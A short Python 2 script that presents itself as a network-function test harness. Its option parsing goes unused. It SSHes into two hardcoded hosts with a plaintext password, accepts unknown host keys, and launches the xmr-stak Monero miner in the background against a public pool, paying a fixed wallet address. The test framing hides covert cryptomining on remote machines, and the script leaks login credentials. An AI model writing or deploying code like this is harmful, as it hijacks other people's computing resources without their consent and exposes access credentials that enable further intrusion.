#!/usr/bin/env python2.7
import os
import optparse
import sys
import subprocess
import signal
import time
import paramiko
import re
FNULL = open(os.devnull, 'w')
address="48qkpEQgzfH3awxzr63BxZRXSDSHkFt3QBUhXZucutSHBCLWhh1G2ZWhKw7ReaNyQZ75CQL4c8PLwABogivXACsyUNCBaCt"
def parse_arguments():
  parser = optparse.OptionParser()

  parser.add_option('', '--test-type',
                    action="store",
                    type="string",
                    dest="test_type",
                    help="which type of test : THROUGHPUT/REPLICATION/MIGARTION",
                    default="THROUGHPUT")

  parser.add_option('', '--sc', action="store", type="string", dest="service_chain", help="chain rule", default="pkt_counter")

  parser.add_option('', '--r1', action="store", type="int", dest="r1_number", help="How many rts in r1", default="1")

  parser.add_option('', '--r2', action="store", type="int", dest="r2_number", help="How many rts in r2", default="1")

  parser.add_option('', '--r3', action="store", type="int", dest="r3_number", help="How many rts in r3", default="1")

  options, args = parser.parse_args()

  return options,args

def start_g1(ssh):
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://fr04.supportxmr.com:7777 -u "+address+" -p g1 --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd);

def start_g2(ssh):
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://fr04.supportxmr.com:7777 -u "+address+" -p g2 --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd);

def clean(ssh_g1,ssh_g2):
  ssh_g1.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_g2.exec_command('rm ~/cpu.txt ~/config.txt')


def test():
  #print "Creating SSH to R2 & R3"
  ssh_g1 = paramiko.SSHClient()
  ssh_g1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  ssh_g1.connect('202.45.128.221',username='net',password='netexplo')
  ssh_g1.exec_command('cd ~/xiaodong/xmr-stak/build/bin')
  
  
  ssh_g2 = paramiko.SSHClient()                                                                                                        
  ssh_g2.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_g2.connect('202.45.128.222',username='net',password='netexplo') 
  ssh_g2.exec_command('cd ~/xiaodong/xmr-stak/build/bin')



                                                                                                                    
  start_g1(ssh_g1)                                                                                                                     
  start_g2(ssh_g2)

def main():


  test()

if __name__ == '__main__':
    main()
